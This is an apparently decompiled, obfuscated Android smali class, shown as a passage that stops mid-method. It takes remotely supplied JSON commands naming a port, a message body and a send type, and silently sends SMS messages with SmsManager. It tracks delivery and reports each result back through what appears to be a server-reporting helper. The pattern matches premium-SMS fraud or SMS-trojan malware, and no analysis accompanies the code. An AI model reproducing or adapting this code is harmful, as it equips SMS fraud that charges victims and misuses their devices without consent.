.class public Lcom/boJUF/mB/mB/pO/Iy/tP/uI;
.super Lcom/boJUF/mB/mB/pO/tP/uI;


# static fields
.field private static volatile sj:Lcom/boJUF/mB/mB/pO/Iy/tP/uI;


# instance fields
.field private IL:Lcom/boJUF/mB/mB/pO/Iy/mB/uI;

.field private Lx:Ljava/lang/String;

.field private VY:Landroid/content/Context;

.field private bh:Ljava/lang/String;

.field private gj:Ljava/lang/Runnable;

.field private rC:Ljava/lang/String;

.field private uv:Landroid/content/BroadcastReceiver;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    sput-object v0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->sj:Lcom/boJUF/mB/mB/pO/Iy/tP/uI;

    return-void
.end method

.method private constructor <init>(Landroid/content/Context;)V
    .locals 1

    invoke-direct {p0}, Lcom/boJUF/mB/mB/pO/tP/uI;-><init>()V

    const-string v0, "SENT_SMS_ACTION"

    iput-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->bh:Ljava/lang/String;

    const-string v0, "SMS_DELIVERED_ACTION"

    iput-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->rC:Ljava/lang/String;

    new-instance v0, Lcom/boJUF/mB/mB/pO/Iy/tP/oC;

    invoke-direct {v0, p0}, Lcom/boJUF/mB/mB/pO/Iy/tP/oC;-><init>(Lcom/boJUF/mB/mB/pO/Iy/tP/uI;)V

    iput-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->gj:Ljava/lang/Runnable;

    new-instance v0, Lcom/boJUF/mB/mB/pO/Iy/tP/ac;

    invoke-direct {v0, p0}, Lcom/boJUF/mB/mB/pO/Iy/tP/ac;-><init>(Lcom/boJUF/mB/mB/pO/Iy/tP/uI;)V

    iput-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->uv:Landroid/content/BroadcastReceiver;

    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iput-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->VY:Landroid/content/Context;

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->VY:Landroid/content/Context;

    invoke-static {v0}, Lcom/boJUF/mB/mB/pO/Iy/mB/uI;->LA(Landroid/content/Context;)Lcom/boJUF/mB/mB/pO/Iy/mB/uI;

    move-result-object v0

    iput-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->IL:Lcom/boJUF/mB/mB/pO/Iy/mB/uI;

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->IL:Lcom/boJUF/mB/mB/pO/Iy/mB/uI;

    invoke-virtual {v0}, Lcom/boJUF/mB/mB/pO/Iy/mB/uI;->TP()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->Lx:Ljava/lang/String;

    return-void
.end method

.method static synthetic LA(Lcom/boJUF/mB/mB/pO/Iy/tP/uI;)Lcom/boJUF/mB/mB/pO/Iy/mB/uI;
    .locals 1

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->IL:Lcom/boJUF/mB/mB/pO/Iy/mB/uI;

    return-object v0
.end method

.method private LA(Ljava/lang/String;)Lcom/boJUF/mB/mB/pO/Iy/tP/tQ;
    .locals 3

    new-instance v1, Lcom/boJUF/mB/mB/pO/Iy/tP/tQ;

    invoke-direct {v1, p0}, Lcom/boJUF/mB/mB/pO/Iy/tP/tQ;-><init>(Lcom/boJUF/mB/mB/pO/Iy/tP/uI;)V

    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0, p1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string v2, "port"

    invoke-virtual {v0, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v1, Lcom/boJUF/mB/mB/pO/Iy/tP/tQ;->LA:Ljava/lang/String;

    const-string v2, "cmd"

    invoke-virtual {v0, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v1, Lcom/boJUF/mB/mB/pO/Iy/tP/tQ;->cp:Ljava/lang/String;

    const-string v2, "sourcePort"

    invoke-virtual {v0, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v1, Lcom/boJUF/mB/mB/pO/Iy/tP/tQ;->On:Ljava/lang/String;

    const-string v2, "sendType"

    invoke-virtual {v0, v2}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v0

    iput v0, v1, Lcom/boJUF/mB/mB/pO/Iy/tP/tQ;->TP:I
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-object v1

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method public static LA(Landroid/content/Context;)Lcom/boJUF/mB/mB/pO/Iy/tP/uI;
    .locals 2

    sget-object v0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->sj:Lcom/boJUF/mB/mB/pO/Iy/tP/uI;

    if-nez v0, :cond_1

    const-class v1, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;

    monitor-enter v1

    :try_start_0
    sget-object v0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->sj:Lcom/boJUF/mB/mB/pO/Iy/tP/uI;

    if-nez v0, :cond_0

    new-instance v0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;

    invoke-direct {v0, p0}, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;-><init>(Landroid/content/Context;)V

    sput-object v0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->sj:Lcom/boJUF/mB/mB/pO/Iy/tP/uI;

    :cond_0
    monitor-exit v1
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    :cond_1
    sget-object v0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->sj:Lcom/boJUF/mB/mB/pO/Iy/tP/uI;

    return-object v0

    :catchall_0
    move-exception v0

    monitor-exit v1

    throw v0
.end method

.method private LA(ILjava/lang/String;I)V
    .locals 2

    :try_start_0
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/boJUF/mB/mB/pO/Iy/tP/XQ;

    invoke-direct {v1, p0, p1, p2, p3}, Lcom/boJUF/mB/mB/pO/Iy/tP/XQ;-><init>(Lcom/boJUF/mB/mB/pO/Iy/tP/uI;ILjava/lang/String;I)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method static synthetic LA(Lcom/boJUF/mB/mB/pO/Iy/tP/uI;ILcom/boJUF/mB/mB/pO/mB/jj;)V
    .locals 7

    :try_start_0
    invoke-virtual {p2}, Lcom/boJUF/mB/mB/pO/mB/jj;->IL()I

    move-result v0

    invoke-virtual {p2}, Lcom/boJUF/mB/mB/pO/mB/jj;->TP()I

    move-result v1

    invoke-virtual {p2}, Lcom/boJUF/mB/mB/pO/mB/jj;->na()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p2}, Lcom/boJUF/mB/mB/pO/mB/jj;->oC()I

    move-result v3

    new-instance v4, Lcom/boJUF/mB/mB/pO/mB/XQ;

    invoke-direct {v4}, Lcom/boJUF/mB/mB/pO/mB/XQ;-><init>()V

    invoke-virtual {p2}, Lcom/boJUF/mB/mB/pO/mB/jj;->cp()Ljava/lang/String;

    move-result-object v5

    iput-object v5, v4, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    invoke-virtual {p2}, Lcom/boJUF/mB/mB/pO/mB/jj;->On()Ljava/lang/String;

    move-result-object v5

    iput-object v5, v4, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    const/4 v5, -0x1

    if-ne p1, v5, :cond_3

    iget-object v5, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->IL:Lcom/boJUF/mB/mB/pO/Iy/mB/uI;

    const/4 v6, 0x1

    invoke-virtual {v5, v1, v6}, Lcom/boJUF/mB/mB/pO/Iy/mB/uI;->LA(II)V

    if-nez v0, :cond_2

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    const-string v1, "address"

    iget-object v5, v4, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    invoke-virtual {v0, v1, v5}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "body"

    iget-object v5, v4, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    invoke-virtual {v0, v1, v5}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "success"

    const-string v5, "1"

    invoke-virtual {v0, v1, v5}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const/16 v1, 0x4b1

    iget-object v5, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->VY:Landroid/content/Context;

    invoke-static {v1, v0, v5}, Lcom/boJUF/mB/mB/pO/tP/tQ;->LA(ILjava/util/HashMap;Landroid/content/Context;)Z

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->VY:Landroid/content/Context;

    sget-object v1, Lcom/boJUF/mB/mB/tP/ac;->LA:Ljava/lang/String;

    const/4 v5, 0x1

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static {v0, v1, v5}, Lcom/boJUF/mB/mB/VD/mB/Ke;->LA(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Object;)V

    :goto_0
    invoke-direct {p0, v4}, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->cp(Lcom/boJUF/mB/mB/pO/mB/XQ;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_5

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    const-string v1, "SOID"

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "TID"

    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "flag"

    const-string v2, "1"

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const/16 v1, 0xc1e

    iget-object v2, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->VY:Landroid/content/Context;

    invoke-static {v1, v0, v2}, Lcom/boJUF/mB/mB/pO/tP/tQ;->LA(ILjava/util/HashMap;Landroid/content/Context;)Z

    :goto_1
    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->IL:Lcom/boJUF/mB/mB/pO/Iy/mB/uI;

    invoke-virtual {v0}, Lcom/boJUF/mB/mB/pO/Iy/mB/uI;->cp()Z

    move-result v0

    iget-object v1, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->IL:Lcom/boJUF/mB/mB/pO/Iy/mB/uI;

    invoke-virtual {v1}, Lcom/boJUF/mB/mB/pO/Iy/mB/uI;->On()Z

    move-result v1

    if-nez v0, :cond_0

    if-eqz v1, :cond_1

    :cond_0
    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->VY:Landroid/content/Context;

    invoke-static {v0}, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->LA(Landroid/content/Context;)Lcom/boJUF/mB/mB/pO/JO/tP/ac;

    move-result-object v0

    invoke-virtual {v0}, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->TP()V

    :cond_1
    :goto_2
    return-void

    :cond_2
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    const-string v1, "SOID"

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "TID"

    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v1, v5}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "flag"

    invoke-static {p1}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v1, v5}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const/16 v1, 0xc1d

    iget-object v5, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->VY:Landroid/content/Context;

    invoke-static {v1, v0, v5}, Lcom/boJUF/mB/mB/pO/tP/tQ;->LA(ILjava/util/HashMap;Landroid/content/Context;)Z

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->IL:Lcom/boJUF/mB/mB/pO/Iy/mB/uI;

    const/4 v1, 0x2

    const/4 v5, 0x1

    invoke-virtual {v0, v2, v3, v1, v5}, Lcom/boJUF/mB/mB/pO/Iy/mB/uI;->LA(Ljava/lang/String;III)V

    const/4 v0, 0x1

    const/16 v1, 0x3ea

    invoke-virtual {p0, p2, v0, v1}, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->LA(Lcom/boJUF/mB/mB/pO/mB/jj;II)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_2

    :cond_3
    :try_start_1
    iget-object v5, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->IL:Lcom/boJUF/mB/mB/pO/Iy/mB/uI;

    const/4 v6, 0x2

    invoke-virtual {v5, v1, v6}, Lcom/boJUF/mB/mB/pO/Iy/mB/uI;->LA(II)V

    if-nez v0, :cond_4

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    const-string v1, "address"

    iget-object v5, v4, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    invoke-virtual {v0, v1, v5}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "body"

    iget-object v5, v4, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    invoke-virtual {v0, v1, v5}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "success"

    const-string v5, "0"

    invoke-virtual {v0, v1, v5}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const/16 v1, 0x4b1

    iget-object v5, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->VY:Landroid/content/Context;

    invoke-static {v1, v0, v5}, Lcom/boJUF/mB/mB/pO/tP/tQ;->LA(ILjava/util/HashMap;Landroid/content/Context;)Z

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->VY:Landroid/content/Context;

    sget-object v1, Lcom/boJUF/mB/mB/tP/ac;->LA:Ljava/lang/String;

    const/4 v5, 0x0

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static {v0, v1, v5}, Lcom/boJUF/mB/mB/VD/mB/Ke;->LA(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Object;)V

    goto/16 :goto_0

    :cond_4
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    const-string v1, "SOID"

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "TID"

    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v1, v5}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "flag"

    invoke-static {p1}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v1, v5}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const/16 v1, 0xc1d

    iget-object v5, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->VY:Landroid/content/Context;

    invoke-static {v1, v0, v5}, Lcom/boJUF/mB/mB/pO/tP/tQ;->LA(ILjava/util/HashMap;Landroid/content/Context;)Z

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->IL:Lcom/boJUF/mB/mB/pO/Iy/mB/uI;

    const/4 v1, 0x2

    const/4 v5, 0x2

    invoke-virtual {v0, v2, v3, v1, v5}, Lcom/boJUF/mB/mB/pO/Iy/mB/uI;->LA(Ljava/lang/String;III)V

    const/4 v0, 0x0

    const/16 v1, 0x837

    invoke-virtual {p0, p2, v0, v1}, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->LA(Lcom/boJUF/mB/mB/pO/mB/jj;II)V

    goto/16 :goto_0

    :cond_5
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    const-string v1, "SOID"

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "TID"

    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "flag"

    const-string v2, "0"

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const/16 v1, 0xc1e

    iget-object v2, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->VY:Landroid/content/Context;

    invoke-static {v1, v0, v2}, Lcom/boJUF/mB/mB/pO/tP/tQ;->LA(ILjava/util/HashMap;Landroid/content/Context;)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_1
.end method

.method static synthetic LA(Lcom/boJUF/mB/mB/pO/Iy/tP/uI;Lcom/boJUF/mB/mB/pO/mB/jj;)V
    .locals 12

    :try_start_0
    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/jj;->Lx()Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x2

    invoke-static {v0, v1}, Lcom/boJUF/mB/mB/pO/tP/oC;->cp(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->LA(Ljava/lang/String;)Lcom/boJUF/mB/mB/pO/Iy/tP/tQ;

    move-result-object v0

    new-instance v1, Ljava/util/HashMap;

    invoke-direct {v1}, Ljava/util/HashMap;-><init>()V

    const-string v2, "SOID"

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/jj;->na()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v2, "TID"

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/jj;->oC()I

    move-result v3

    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v2, "text"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "{\'address\':\'"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v4, v0, Lcom/boJUF/mB/mB/pO/Iy/tP/tQ;->LA:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "\',\'body\':\'"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    iget-object v4, v0, Lcom/boJUF/mB/mB/pO/Iy/tP/tQ;->cp:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "\'}"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const/16 v2, 0xc1f

    iget-object v3, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->VY:Landroid/content/Context;

    invoke-static {v2, v1, v3}, Lcom/boJUF/mB/mB/pO/tP/tQ;->LA(ILjava/util/HashMap;Landroid/content/Context;)Z

    iget v1, v0, Lcom/boJUF/mB/mB/pO/Iy/tP/tQ;->TP:I

    packed-switch v1, :pswitch_data_0

    :cond_0
    :goto_0
    return-void

    :pswitch_0
    sget-object v1, Lcom/boJUF/mB/mB/tP/uI;->LU:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    :try_start_1
    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/jj;->TP()I

    move-result v6

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/jj;->na()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/jj;->oC()I

    move-result v8

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/jj;->IL()I

    move-result v2

    iget-object v3, v0, Lcom/boJUF/mB/mB/pO/Iy/tP/tQ;->cp:Ljava/lang/String;

    iget-object v1, v0, Lcom/boJUF/mB/mB/pO/Iy/tP/tQ;->LA:Ljava/lang/String;

    invoke-virtual {p1, v1}, Lcom/boJUF/mB/mB/pO/mB/jj;->On(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->Lx:Ljava/lang/String;

    invoke-virtual {p1, v0}, Lcom/boJUF/mB/mB/pO/mB/jj;->LA(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->IL:Lcom/boJUF/mB/mB/pO/Iy/mB/uI;

    invoke-virtual {v0, v6}, Lcom/boJUF/mB/mB/pO/Iy/mB/uI;->cp(I)V

    invoke-static {v3}, Lcom/boJUF/mB/mB/mB/uI;->LA(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    invoke-virtual {p1, v3}, Lcom/boJUF/mB/mB/pO/mB/jj;->cp(Ljava/lang/String;)V

    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v5, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->bh:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    iput-object v4, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->bh:Ljava/lang/String;

    iget-object v4, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->VY:Landroid/content/Context;

    iget-object v5, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->uv:Landroid/content/BroadcastReceiver;

    new-instance v9, Landroid/content/IntentFilter;

    iget-object v10, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->bh:Ljava/lang/String;

    invoke-direct {v9, v10}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v5, v9}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    new-instance v4, Landroid/content/Intent;

    iget-object v5, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->bh:Ljava/lang/String;

    invoke-direct {v4, v5}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    new-instance v5, Landroid/content/Intent;

    iget-object v9, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->rC:Ljava/lang/String;

    invoke-direct {v5, v9}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v9, "id"

    invoke-virtual {v4, v9, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    const-string v9, "soid"

    invoke-virtual {v4, v9, v7}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v9, "subid"

    invoke-virtual {v4, v9, v8}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    const-string v9, "port"

    invoke-virtual {v4, v9, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v9, "smsType"

    invoke-virtual {v4, v9, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    const-string v2, "cmd"

    invoke-virtual {v4, v2, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v2, "msa"

    iget-object v9, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->Lx:Ljava/lang/String;

    invoke-virtual {v4, v2, v9}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    iget-object v2, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->VY:Landroid/content/Context;

    const/4 v9, 0x0

    const/4 v10, 0x0

    invoke-static {v2, v9, v5, v10}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v5

    iget-object v2, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->VY:Landroid/content/Context;

    const/4 v9, 0x0

    const/4 v10, 0x0

    invoke-static {v2, v9, v4, v10}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v4

    const/4 v2, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    invoke-direct {p0, v6, v7, v8}, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->LA(ILjava/lang/String;I)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_0

    :catch_0
    move-exception v0

    :try_start_2
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    sget-object v0, Lcom/boJUF/mB/mB/tP/uI;->b:Ljava/lang/String;

    goto/16 :goto_0

    :pswitch_1
    sget-object v1, Lcom/boJUF/mB/mB/tP/uI;->Bg:Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :try_start_3
    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/jj;->TP()I

    move-result v7

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/jj;->na()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/jj;->oC()I

    move-result v9

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/jj;->IL()I

    move-result v2

    iget-object v3, v0, Lcom/boJUF/mB/mB/pO/Iy/tP/tQ;->cp:Ljava/lang/String;

    iget-object v1, v0, Lcom/boJUF/mB/mB/pO/Iy/tP/tQ;->LA:Ljava/lang/String;

    iget-object v10, v0, Lcom/boJUF/mB/mB/pO/Iy/tP/tQ;->On:Ljava/lang/String;

    invoke-virtual {p1, v1}, Lcom/boJUF/mB/mB/pO/mB/jj;->On(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->Lx:Ljava/lang/String;

